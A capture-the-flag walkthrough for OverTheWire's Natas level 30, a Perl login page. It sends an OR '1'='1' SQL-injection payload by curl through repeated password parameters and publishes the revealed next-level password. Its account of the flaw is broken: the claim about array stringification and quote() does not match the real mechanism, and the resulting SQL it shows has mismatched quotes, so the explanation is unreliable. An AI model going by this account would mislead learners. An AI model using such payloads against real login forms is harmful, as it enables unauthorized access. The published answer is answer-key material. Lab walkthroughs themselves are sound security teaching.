# Natas Level 30 → 31

## Goal

The Perl script builds a SQL query with `$dbh->quote()` around the password parameter — but if you pass **an array** as `password`, the quoting is bypassed entirely, and your array elements are glued into the SQL as raw strings.

## Concepts you'll learn

- Perl's `DBI::quote()` only works on scalars — arrays sneak past
- How Perl CGI maps repeated URL parameters (`?password=x&password=y`) to array refs in `$cgi->param("password")`
- A familiar SQL-injection payload delivered via an unusual vector

## Walkthrough

### 1. View the source

```perl
my $query = "SELECT * FROM users WHERE username=" . $dbh->quote($username)
          . " AND password=" . $dbh->quote($password);
```

`quote()` expects a scalar; if `$password` is an array reference (which happens when multiple `password=` parameters arrive), Perl stringifies the array with space separation and **does not escape quotes inside**.

### 2. Send the payload

Multiple `password=` parameters:

```bash
$ curl -u natas30:<pass> \
       "http://natas30.natas.labs.overthewire.org/index.pl?username=admin&password=1&password=1' OR '1'='1"
```

Perl concatenates the array elements; the resulting SQL becomes:

```sql
SELECT * FROM users WHERE username='admin' AND password='1 1' OR '1'='1'
```

The `OR '1'='1'` at the end makes the whole WHERE true. The login succeeds.

Output:

```
hay7aecuungiuKaezuathuk9biin0pu1
```

## The answer

The password for `natas31` is:

**`hay7aecuungiuKaezuathuk9biin0pu1`**

> ⚠️ OverTheWire may rotate passwords without notice. This value was correct at the time the level was solved — if it fails for you, re-solve the level using the method above rather than assuming the writeup is wrong.

## Reference

- Official level page: <http://natas30.natas.labs.overthewire.org/>
